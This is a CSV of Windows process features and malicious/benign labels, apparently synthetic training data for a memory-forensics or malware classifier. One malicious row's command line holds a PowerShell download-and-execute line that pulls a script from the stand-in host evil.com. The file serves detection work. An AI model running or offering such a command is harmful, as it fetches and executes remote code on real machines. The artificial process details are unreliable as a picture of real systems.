process_name,pid,ppid,cmd_line,cmd_line_length,num_threads,num_handles,working_set_mb,private_bytes_mb,session_id,is_signed,num_loaded_dlls,has_network_conn,num_network_conns,writable_exec_sections,private_memory_ratio,heap_executable,vad_count,suspicious_parent,process_hollowing,dll_injection,reflective_load,encoded_powershell,lolbin_usage,wmi_execution,unusual_thread_start,yara_hits,memory_anomaly_score,label
conhost.exe,705,766,C:\Windows\System32\conhost.exe,90,18,255,77.88,36.48,0,1,34,0,0,0,0.077,0,92,0,0,0,0,0,0,0,0,0,0.117,0
mspaint.exe,1809,9564,C:\Windows\System32\mspaint.exe,55,7,146,125.55,41.57,1,0,6,1,3,3,0.871,1,159,1,1,0,0,0,0,0,1,3,0.6771,1
notepad.exe,8412,4859,C:\Windows\System32\notepad.exe,115,9,226,117.24,32.12,0,1,55,0,0,0,0.083,0,103,0,0,0,0,0,0,0,0,0,0.0866,0
SearchIndexer.exe,5635,3146,C:\Windows\System32\SearchIndexer.exe,93,10,285,38.52,79.63,0,1,77,0,0,0,0.267,0,101,0,0,0,0,0,0,0,0,0,0.1476,0
RuntimeBroker.exe,7790,6212,C:\Windows\System32\RuntimeBroker.exe,20,29,326,103.57,22.93,1,1,53,0,0,0,0.337,0,33,0,0,0,0,0,0,0,0,0,0.0984,0
RuntimeBroker.exe,1640,2704,C:\Windows\System32\RuntimeBroker.exe,23,8,216,161.31,12.97,1,1,69,0,0,0,0.335,0,28,0,0,0,0,0,0,0,0,0,0.0695,0
SearchIndexer.exe,4839,4354,C:\Windows\System32\SearchIndexer.exe,65,21,57,15.06,3.53,1,1,47,0,0,0,0.337,0,66,0,0,0,0,0,0,0,0,0,0.0419,0
SearchIndexer.exe,6741,3981,C:\Windows\System32\SearchIndexer.exe,46,12,422,146.15,79.98,1,1,5,0,0,0,0.304,0,86,0,0,0,0,0,0,0,0,0,0.149,0
MsMpEng.exe,1433,4169,"""C:\Program Files\Windows Defender\MsMpEng.exe""",80,20,81,69.19,65.09,0,1,35,0,0,0,0.078,0,69,0,0,0,0,0,0,0,0,0,0.011,0
bitsadmin.exe,5407,4571,bitsadmin.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),175,3,94,32.01,26.89,1,1,38,1,1,2,0.443,1,48,1,0,0,0,1,1,0,0,1,0.6689,1
notepad.exe,6466,9491,C:\Windows\System32\notepad.exe,50,9,170,78.65,61.0,1,0,83,0,1,3,0.947,1,93,0,0,1,0,0,0,0,0,3,0.9183,1
MsMpEng.exe,3479,5326,"""C:\Program Files\Windows Defender\MsMpEng.exe""",32,32,447,189.53,42.99,1,1,6,0,0,0,0.25,0,90,0,0,0,0,0,0,0,0,0,0.0326,0
svchost.exe,8393,1724,C:\Windows\system32\svchost.exe -k netsvcs,68,38,458,133.94,91.45,1,1,17,0,0,0,0.266,0,58,0,0,0,0,0,0,0,0,0,0.0961,0
svchost.exe,5174,9328,wmiprvse.exe -secured -Embedding,35,8,87,26.4,25.48,1,1,29,1,1,2,0.74,1,94,1,0,0,0,0,0,1,0,2,0.7281,1
notepad.exe,838,1226,C:\Windows\System32\notepad.exe,51,8,103,138.49,34.45,1,1,51,0,0,0,0.251,0,72,0,0,0,0,0,0,0,0,0,0.1174,0
notepad.exe,1837,5829,C:\Windows\System32\notepad.exe,59,10,121,87.39,172.93,1,0,69,0,1,2,0.703,1,182,0,0,1,0,0,0,0,0,2,0.5603,1
explorer.exe,7425,2824,C:\Windows\System32\explorer.exe,51,7,391,86.44,79.4,1,0,146,0,1,7,0.802,1,121,0,0,1,0,0,0,0,0,1,0.8642,1
explorer.exe,8674,4065,C:\Windows\Explorer.EXE,38,27,377,108.65,53.17,1,1,19,0,0,0,0.257,0,118,0,0,0,0,0,0,0,0,0,0.0274,0
calc.exe,2356,2079,C:\Windows\System32\calc.exe,66,5,138,132.73,83.04,1,0,11,1,5,3,0.683,1,192,1,1,0,0,0,0,0,1,4,0.7774,1
System,4,9765,C:\Windows\System32\System,30,39,287,14.41,93.18,1,1,14,0,0,0,0.109,0,95,0,0,0,0,0,0,0,0,0,0.0145,0
MsMpEng.exe,1487,1611,"""C:\Program Files\Windows Defender\MsMpEng.exe""",54,34,170,71.72,59.75,1,1,28,0,0,0,0.101,0,42,0,0,0,0,0,0,0,0,0,0.0707,0
notepad.exe,9089,1297,C:\Windows\System32\notepad.exe,102,28,170,55.95,65.76,0,1,47,0,0,0,0.281,0,67,0,0,0,0,0,0,0,0,0,0.1346,0
winlogon.exe,577,551,C:\Windows\System32\winlogon.exe,48,23,338,79.88,96.03,1,1,17,0,0,0,0.082,0,42,0,0,0,0,0,0,0,0,0,0.0787,0
csrss.exe,3469,1327,C:\Windows\System32\csrss.exe,98,18,381,20.18,90.31,0,1,14,0,0,0,0.111,0,65,0,0,0,0,0,0,0,0,0,0.0459,0
SearchIndexer.exe,6356,4649,C:\Windows\System32\SearchIndexer.exe,81,39,421,77.55,18.48,0,1,62,0,0,0,0.136,0,55,0,0,0,0,0,0,0,0,0,0.0262,0
winlogon.exe,4216,5383,C:\Windows\System32\winlogon.exe,73,24,201,133.75,36.94,1,1,8,0,0,0,0.163,0,73,0,0,0,0,0,0,0,0,0,0.0725,0
firefox.exe,1039,5521,C:\Windows\System32\firefox.exe,81,33,278,68.56,33.82,1,1,34,0,10,0,0.161,0,54,0,0,0,0,0,0,0,0,0,0.021,0
